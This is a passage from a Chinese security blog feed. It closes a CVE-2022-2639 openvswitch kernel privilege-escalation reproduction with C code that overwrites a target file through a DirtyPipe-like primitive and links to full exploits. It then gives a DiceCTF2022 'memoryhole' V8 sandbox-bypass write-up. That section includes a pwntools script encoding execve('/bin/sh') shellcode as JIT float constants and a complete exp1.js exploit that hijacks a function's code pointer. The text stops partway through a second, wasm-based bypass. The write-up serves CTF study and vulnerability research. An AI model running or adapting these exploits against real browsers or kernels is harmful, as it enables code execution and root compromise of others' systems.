<p>—-摘自 <a href="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">veritas501 博客</a></p>
</blockquote>
<p><img src="/img/CVE-2022-2639/2-14.png"></p>
<p>下次对 pipe 写入就会修改文件的 page cache，得到和 DirtyPipe 一样任意文件写的能力！对本地提权来说只要修改 suid 程序的内容或是修改 &#x2F;etc&#x2F;passwd 即可。向目标文件中写入 attack_data，并检查是否成功写入。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">logd(<span class="string">&quot;[4-12] try to overwrite %s&quot;</span>, ATTACK_FILE);</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ssize_t</span> nbytes = write(pipes[uaf_pipe_idx][<span class="number">1</span>], attack_data, <span class="keyword">sizeof</span>(attack_data));</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) die(<span class="string">&quot;[-] write failed&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">size_t</span>)nbytes &lt; <span class="keyword">sizeof</span>(attack_data)) die(<span class="string">&quot;[-] short write&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logd(<span class="string">&quot;[*] see if %s changed ...&quot;</span>, ATTACK_FILE);</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(ATTACK_FILE, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) die(<span class="string">&quot;[-] open attack file&quot;</span>);</span><br><span class="line">    <span class="type">char</span> tmp_buffer[<span class="number">0x10</span>];</span><br><span class="line">    read(fd, tmp_buffer, <span class="number">0x10</span>);</span><br><span class="line">    <span class="type">uint32_t</span> *ptr = (<span class="type">uint32_t</span> *)(tmp_buffer + <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">if</span> (ptr[<span class="number">0</span>] != <span class="number">0x56565656</span>)</span><br><span class="line">        die(<span class="string">&quot;[-] overwrite attack file failed: 0x%08x&quot;</span>, ptr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/res.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过页风水到一步一步获得 UAF 到最后创造了 DirtyPipe 的条件完成任意文件写，无需泄露内核基址就完成了提权，为其他直接或者通过转化能获得类似条件的漏洞利用提供了新思路。</p>
<p>exp 可见 <a href="https://github.com/cxxz16/kernel_study/tree/main/cve-2022-2639">kernel_study&#x2F;cve-2022-2639 at main · cxxz16&#x2F;kernel_study (github.com)</a></p>
<p>编译好的内核、文件系统和exp等文件可见 <a href="https://github.com/bsauce/kernel-exploit-factory">bsauce-exploit及测试环境下载地址</a></p>
<p>文章中如果任何错误或疑问，望各位读者不吝赐教，及时指正，非常感谢。期待与大家共同交流进步。</p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ol>
<li><a href="https://bsauce.github.io/2022/07/16/CVE-2022-1015/#3-4-%E9%80%9A%E8%BF%87netlink%E4%B8%8Enftables-%E4%BA%A4%E4%BA%92">bsauce CVE-2022-1015</a></li>
<li><a href="https://bsauce.github.io/2022/11/24/CVE-2022-2639/">bsauce CVE-2022-2639</a></li>
<li><a href="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2022-2639 openvswitch LPE 漏洞分析</a></li>
</ol>
]]></content>
      <categories>
        <category>cve 复现</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-0185的三种利用方式(二)</title>
    <url>/2022/12/05/CVE-2022-0185%E7%9A%84%E4%B8%89%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-%E4%BA%8C/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>DiceCTF2022 memoryhole &amp; V8沙箱绕过</title>
    <url>/2022/12/06/DiceCTF2022-memoryhole-V8%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>DiceCTF2022 memoryhole 题目复现与两种 V8 沙箱绕过方式学习。</p>
<span id="more"></span>

<h1 id="指针压缩"><a href="#指针压缩" class="headerlink" title="指针压缩"></a>指针压缩</h1><p>V8 在其堆中实现了指针压缩。通过指针压缩，从 V8 堆中的一个对象到 V8 堆中的另一个对象（“堆上”）的每个引用都会成为距堆基址的 32 位偏移量，只留下少数具有指向外部对象的原始指针的对象v8 堆（“堆外”）。压缩指针仅在 4GB 虚拟内存区域内有效，称为指针压缩。指针压缩可以通过内存中的 ArrayBuffer 实例来可视化。下面显示了没有指针压缩的假设 ArrayBuffer 对象的内存布局：</p>
<p><img src="/img/Dicectf2022-memoryhole/0-0.png"></p>
<p>指针压缩后：</p>
<p><img src="/img/Dicectf2022-memoryhole/0-1.png"></p>
<p><strong>指针压缩比较好绕过，因为除了堆上指针，堆外指针都可以正常使用，如 backing store，所以如果能篡改 backing store 还是可以实现无限制的任意地址写。</strong></p>
<h1 id="Sandbox"><a href="#Sandbox" class="headerlink" title="Sandbox"></a>Sandbox</h1><p>为了保护同一进程的其他内存免受损害，V8 堆中的所有原始指针就 “sandboxified” ，<strong>将他们转换为相对于沙箱底部的偏移量或转换为索引进入外部指针表，以基址+偏移的形式访问，限定了可访问的范围，从而防止任意地址读写。</strong>沙箱的实现通过：</p>
<ul>
<li>在 V8 初始化期间保留了一个大的（例如 1TB）虚拟地址空间区域——沙箱。该区域包含 pointer compression cage、所有 V8 堆以及 ArrayBuffer 的 backing store 和类似对象。</li>
<li>沙箱内但 V8 堆之外的所有对象都使用固定大小的偏移量（例如，在 1TB 沙箱的情况下为 40 位偏移量）而不是原始指针进行寻址。</li>
<li>所有剩余的堆外对象都必须通过外部指针表进行引用，该表包含指向对象的指针以及类型信息，以防止类型混淆攻击。然后通过索引从 v8 堆中的对象引用此表中的条目。</li>
</ul>
<p><img src="/img/Dicectf2022-memoryhole/0-3.png"></p>
<p>原始的堆外 backing store 指针（紫色）已被替换为距离沙箱底部的 40 位偏移量（偏移量为 0x45c00，向左移动 24 位以保证最高位为零）。另一方面，指向 ArrayBufferExtension 对象（橙色）的原始指针已替换为指向外部指针表的 32 位索引。</p>
<p>现在假设攻击者能够从多个线程任意破坏沙箱内的内存，还需要一个额外的漏洞来破坏沙箱外的内存，从而执行任意代码。</p>
<p>详细的沙箱细节在<a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#">V8 Sandbox - High-Level Design Doc - Google 文档</a>。</p>
<p><img src="/img/Dicectf2022-memoryhole/0-2.png"></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>漏洞是白给的数组长度任意修改。但是开启了沙箱。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">   # Enable the experimental V8 sandbox.</span><br><span class="line">   # Sets -DV8_SANDBOX.</span><br><span class="line"><span class="deletion">-  v8_enable_sandbox = false</span></span><br><span class="line"><span class="addition">+  v8_enable_sandbox = true</span></span><br><span class="line"></span><br><span class="line">   # Enable external pointer sandboxing. Requires v8_enable_sandbox.</span><br><span class="line">   # Sets -DV8_SANDBOXED_EXTERNAL_POINRTERS.</span><br><span class="line"><span class="deletion">-  v8_enable_sandboxed_external_pointers = false</span></span><br><span class="line"><span class="addition">+  v8_enable_sandboxed_external_pointers = true</span></span><br><span class="line"></span><br><span class="line">   # Enable sandboxed pointers. Requires v8_enable_sandbox.</span><br><span class="line">   # Sets -DV8_SANDBOXED_POINTERS.</span><br><span class="line"><span class="deletion">-  v8_enable_sandboxed_pointers = false</span></span><br><span class="line"><span class="addition">+  v8_enable_sandboxed_pointers = true</span></span><br><span class="line"></span><br><span class="line">   # Enable all available sandbox features. Implies v8_enable_sandbox.</span><br><span class="line"><span class="deletion">-  v8_enable_sandbox_future = false</span></span><br><span class="line"><span class="addition">+  v8_enable_sandbox_future = true</span></span><br></pre></td></tr></table></figure>

<p>TypeArray 中的 backing store 指针限制被 data_ptr 代替，计算公式为 data_ptr &#x3D; js_base + (external_pointer &lt;&lt; 8) + base_pointer，<code>%DebugPrint</code> 会显示已经加完了 js_base 的完整的指针，所以要查看内存看真正的值，但是无论这两个指针的值是什么，data_ptr 都是被限制在了 40bit 内的空间。</p>
<p><img src="/img/Dicectf2022-memoryhole/0-4.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/0-5.png"></p>
<p>结合前文知识，突破沙箱拿到 shell 有两种办法：一种是在 4 GB 范围内任意读写搞事情；另一种就是再寻找新的包含 64 位可用指针的对象。如下就是这两种方式的具体实现。</p>
<h2 id="方式一：在-jsFunction-中构造包含-jit-shellcode-的立即数"><a href="#方式一：在-jsFunction-中构造包含-jit-shellcode-的立即数" class="headerlink" title="方式一：在 jsFunction 中构造包含 jit shellcode 的立即数"></a>方式一：在 jsFunction 中构造包含 jit shellcode 的立即数</h2><p>写一个 jsFunction：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">foo</span> = (<span class="params"></span>) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">&#125;</span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(foo);</span><br><span class="line"><span class="title function_">foo</span>();</span><br><span class="line">%<span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="title function_">foo</span>();</span><br><span class="line">%<span class="title class_">DebugPrint</span>(foo);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="title function_">foo</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/1-1.png"></p>
<p>可以看到 code 字段在 rx 段。</p>
<p>在 JSFunction 中修改code字段为一个错误的地址：</p>
<p><img src="/img/Dicectf2022-memoryhole/1-2.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/1-3.png"></p>
<p>按c继续运行（注意在 systembreak 后要调用 function）：</p>
<p><img src="/img/Dicectf2022-memoryhole/1-4.png"></p>
<p>可以看出这段的逻辑为：<strong>test dword ptr [rcx+0x1b], 0x20000000 后，如果不跳转，则将 rcx + 0x3f，然后 jmp rcx（前面的 jmp 是跳转到 jmp rcx 指令的地址，看地址与偏移），如果我们将 [rcx+0x1b] 处的值伪造好，与0x20000000与后为0，那么到 jne 的时候就会不跳转继续执行。而 rcx 中的值可控。那么就能劫持 rip。</strong></p>
<p>这里补充一下正常的逻辑（猜测）：</p>
<p><img src="/img/Dicectf2022-memoryhole/1-5.png"></p>
<p>原本 rcx 中的值应为 code 的地址，由于是指针，值被+1，所以 +0x1b 便可以到 0x1c 这样的整 dword 地址处。这里 test 后不为0，那么 jne 就会跳转，应该是跳转到正常的逻辑去执行。</p>
<p><img src="/img/Dicectf2022-memoryhole/1-6.png"></p>
<p>经过优化后的jit代码，存放在距离 code 字段值不远处。</p>
<p>那接下来就是要先将 shellcode 藏在 double 表示的立即数中。</p>
<p>通过 <a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=jmp+0xe&arch=x86-64&as_format=inline#assembly">Online Assembler and Disassembler (shell-storm.org)</a> 得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jmp 0xe  =&gt; &quot;\xeb\x0c&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">jmp = <span class="string">&#x27;\xeb\x0c&#x27;</span></span><br><span class="line">shell = u64(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_double</span>(<span class="params">code</span>):</span><br><span class="line">	<span class="keyword">assert</span> <span class="built_in">len</span>(code) &lt;= <span class="number">6</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(u64(code.ljust(<span class="number">6</span>, <span class="string">&#x27;\x00&#x27;</span>) + jmp))[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">make_double(asm(<span class="string">&quot;push %d; pop rax&quot;</span> % (shell &gt;&gt; <span class="number">0x20</span>)))</span><br><span class="line">make_double(asm(<span class="string">&quot;push %d; pop rdx&quot;</span> % (shell % <span class="number">0x100000000</span>)))</span><br><span class="line">make_double(asm(<span class="string">&quot;shl rax, 0x20; xor esi, esi&quot;</span>))</span><br><span class="line">make_double(asm(<span class="string">&quot;add rax, rdx; xor edx, edx; push rax&quot;</span>))</span><br><span class="line">code = asm(<span class="string">&quot;mov rdi, rsp; push 59; pop rax; syscall&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(code) &lt;= <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(u64(code.ljust(<span class="number">8</span>, <span class="string">&#x27;\x90&#x27;</span>)))[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>

<p>如上脚本得到 shellcode，然后再将十六进制转 IEEE754 浮点数（写到这又想起了今年 qwb 的那道 jit …）。通过<a href="https://www.binaryconvert.com/result_double.html?hexadecimal=0CEB580068732F68">工具</a>，在下面 binary 中输入十六进制数：</p>
<p><img src="/img/Dicectf2022-memoryhole/1-7.png"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.95538254221075331056310651818E-246</span></span><br><span class="line"><span class="number">1.95606125582421466942709801013E-246</span></span><br><span class="line"><span class="number">1.99957147195425773436923756715E-246</span></span><br><span class="line"><span class="number">1.95337673326740932133292175341E-246</span></span><br><span class="line"><span class="number">2.63486047652296056448306022844E-284</span></span><br></pre></td></tr></table></figure>

<p>接下来通过在 func1 的立即数中布置好 shellcode，篡改 func2 的 code 字段直接指向这段 shellcode，再调用 func2 即可触发。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">func</span> = (<span class="params"></span>) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">f</span> = (<span class="params"></span>) =&gt; <span class="number">123</span>;	<span class="comment">// 准备篡改 code 的 func2</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">const</span> o = &#123;<span class="attr">x</span>:<span class="number">1337</span>, <span class="attr">a</span>:f, <span class="attr">b</span>:fun&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ua = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">arr.<span class="title function_">setLength</span>(<span class="number">100</span>);</span><br><span class="line"><span class="title function_">d22u</span>(arr[<span class="number">5</span>]);</span><br><span class="line"><span class="keyword">const</span> funAddr = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">const</span> fAddr = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>找到 func 和 f 的地址：</p>
<p><img src="/img/Dicectf2022-memoryhole/1-8.png"></p>
<p>再准备泄露 typearray 的 base_pointer。</p>
<p>在这过程中发现 typearray 中如果开辟数组长度小于等于16则 data_ptr 字段启用，否则为 nil 并且在内存中没有其值（以前都是直接开辟很小的数组并没有注意到这个问题）：</p>
<p><img src="/img/Dicectf2022-memoryhole/1-9.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/1-10.png"></p>
<p>为了方便计算，这里少开辟两个就行，由于他和elements类似，通过 oob 数组越界读 typearray 中的元素，进而确定 base_pointer 想对于 oob arr 的索引：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ua[<span class="number">0</span>] = <span class="number">0xdeedbeef</span>;</span><br><span class="line"><span class="keyword">var</span> base_ptr = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">10</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">d22u</span>(arr[i]);</span><br><span class="line">    <span class="keyword">const</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">const</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (high == <span class="number">0xdeedbeef</span> || low == <span class="number">0xdeedbeef</span>) &#123;</span><br><span class="line">        base_ptr = i + <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/1-11.png"></p>
<p>可以修改 base_pointer 就可以实现在基址的 4GB 范围内的任意地址写了。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">off</span>) &#123;</span><br><span class="line">    arr[base_ptr] = <span class="title function_">u2d</span>((off-<span class="number">7</span>) * <span class="number">0x100000000</span>);</span><br><span class="line">    <span class="keyword">return</span> ua[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">off, val</span>) &#123;</span><br><span class="line">    arr[base_ptr] = <span class="title function_">u2d</span>((off-<span class="number">7</span>) * <span class="number">0x100000000</span>);</span><br><span class="line">    ua[<span class="number">0</span>] = val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再查看 func1 code 中经过优化的代码，错位看 jit：</p>
<p><img src="/img/Dicectf2022-memoryhole/1-12.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/1-13.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/1-14.png"></p>
<p>根据前面的逻辑，我们使 rcx+0x1b 为 0，rcx &#x3D; rcx + 0x3f，那么此时的 code 就应伪造为 (0x2013000440bc-0x3f-0x201300044001) + 0x201300044001 &#x3D; 0x201300044001 + 0x7c，那么此时 rcx 应为0x201300044001 + 0x7c，[rcx + 0x1b] 与 0x2000000 为0：</p>
<p><img src="/img/Dicectf2022-memoryhole/1-15.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0xff418944000002b8</span> &amp; <span class="number">0x20000000</span> = <span class="number">0L</span></span><br></pre></td></tr></table></figure>

<p>此处选择将 f 函数的 code 覆写为 func1 布置好的 jit 代码段，也就是 jitAddr + 0x7c，这样执行 f() 就会去执行jit了。</p>
<p><img src="/img/Dicectf2022-memoryhole/1res.png"></p>
<h2 id="exp1-js"><a href="#exp1-js" class="headerlink" title="exp1.js"></a>exp1.js</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> __buf8 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> __dvCvt = <span class="keyword">new</span> <span class="title class_">DataView</span>(__buf8);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    __dvCvt.<span class="title function_">setFloat64</span>(<span class="number">0</span>, val, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>) + __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>) * <span class="number">0x100000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Uint64 =&gt; double</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> tmp0 = val &amp; <span class="number">0x100000000</span>;</span><br><span class="line">    __dvCvt.<span class="title function_">setUint32</span>(<span class="number">0</span>, tmp0, <span class="literal">true</span>);</span><br><span class="line">    __dvCvt.<span class="title function_">setUint32</span>(<span class="number">4</span>, (val - tmp0) / <span class="number">0x100000000</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> __dvCvt.<span class="title function_">getFloat64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d22u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    __dvCvt.<span class="title function_">setFloat64</span>(<span class="number">0</span>, val, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">hex</span> = (<span class="params">x</span>) =&gt; (<span class="string">&quot;0x&quot;</span> + x.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">fun</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1.0</span>, </span><br><span class="line">            <span class="number">1.95538254221075331056310651818E-246</span>,</span><br><span class="line">            <span class="number">1.95606125582421466942709801013E-246</span>,</span><br><span class="line">            <span class="number">1.99957147195425773436923756715E-246</span>,</span><br><span class="line">            <span class="number">1.95337673326740932133292175341E-246</span>,</span><br><span class="line">            <span class="number">2.63486047652296056448306022844E-284</span>,</span><br><span class="line">            ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(fun);</span><br><span class="line"><span class="title function_">fun</span>();</span><br><span class="line">%<span class="title class_">OptimizeFunctionOnNextCall</span>(fun);</span><br><span class="line"><span class="title function_">fun</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">f</span> = (<span class="params"></span>) =&gt; <span class="number">123</span>;</span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">const</span> o = &#123;<span class="attr">x</span>:<span class="number">1337</span>, <span class="attr">a</span>:f, <span class="attr">b</span>:fun&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ua = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">arr.<span class="title function_">setLength</span>(<span class="number">100</span>);</span><br><span class="line"><span class="title function_">d22u</span>(arr[<span class="number">5</span>]);</span><br><span class="line"><span class="keyword">const</span> funAddr = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">const</span> fAddr = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] fun addr low = <span class="subst">$&#123;hex(funAddr)&#125;</span>`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] f addr low = <span class="subst">$&#123;hex(fAddr)&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">ua[<span class="number">0</span>] = <span class="number">0xdeedbeef</span>;</span><br><span class="line"><span class="keyword">var</span> base_ptr = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">10</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">d22u</span>(arr[i]);</span><br><span class="line">    <span class="keyword">const</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">const</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (high == <span class="number">0xdeedbeef</span> || low == <span class="number">0xdeedbeef</span>) &#123;</span><br><span class="line">        base_ptr = i + <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (base_ptr == -<span class="number">1</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[-] search base_ptr ptr failed!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] base_ptr offset: &quot;</span> + base_ptr);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] base_ptr (*0x100000000) = <span class="subst">$&#123;hex(d2u(arr[base_ptr]))&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">off</span>) &#123;</span><br><span class="line">    arr[base_ptr] = <span class="title function_">u2d</span>((off-<span class="number">7</span>) * <span class="number">0x100000000</span>);</span><br><span class="line">    <span class="keyword">return</span> ua[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">off, val</span>) &#123;</span><br><span class="line">    arr[base_ptr] = <span class="title function_">u2d</span>((off-<span class="number">7</span>) * <span class="number">0x100000000</span>);</span><br><span class="line">    ua[<span class="number">0</span>] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jitAddr = <span class="title function_">arbRead</span>(funAddr + <span class="number">0x17</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] jitAddr = <span class="subst">$&#123;hex(jitAddr)&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">arbWrite</span>(fAddr + <span class="number">0x17</span>, jitAddr + <span class="number">0x7c</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"><span class="comment">// %DebugPrint(f);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br></pre></td></tr></table></figure>

<h2 id="方式二：利用-wasmInstance-中的全局变量指针"><a href="#方式二：利用-wasmInstance-中的全局变量指针" class="headerlink" title="方式二：利用 wasmInstance 中的全局变量指针"></a>方式二：利用 wasmInstance 中的全局变量指针</h2><p>想要突破限制实现任意地址写，就要<strong>找一些可用、可控的 64 位未被压缩的指针</strong>。使用 <code>%DebugPrint</code> 打印 WasmInstance：</p>
<p><img src="/img/Dicectf2022-memoryhole/2-12.png"></p>
<p>其中的 <code>imported_function_targets</code> 和 <code>imported_mutable_globals</code> 都指向了完整的64 bit 的堆指针。</p>
<p>在 v8 源码中搜索，可以看到一些有用的信息：</p>
<p><img src="/img/Dicectf2022-memoryhole/2-13.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-14.png"></p>
<p>再结合其他注释，大概了解到这是一个存放 wasm 全局变量的东西，且通过源码中的写法，<code>imported_function_targets</code> 指向的应该是个数组，数组的每个索引指向了全局变量的 address。那这时候就可以给我们常用的 wasm 代码加一个全局变量，找到 wasm global 的写法 <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Global/Global">WebAssembly.Global() constructor - WebAssembly | MDN (mozilla.org)</a>。了解到了 WebAssembly Global 的构造方法以后，可以尝试给 Wasm Instance 加一个全局变量：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable language_">global</span> = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Global</span>(&#123;<span class="attr">value</span>:<span class="string">&#x27;i64&#x27;</span>, <span class="attr">mutable</span>:<span class="literal">true</span>&#125;, <span class="number">1234n</span>);<span class="comment">// 注意i64即BigInt</span></span><br><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,</span><br><span class="line">    <span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span 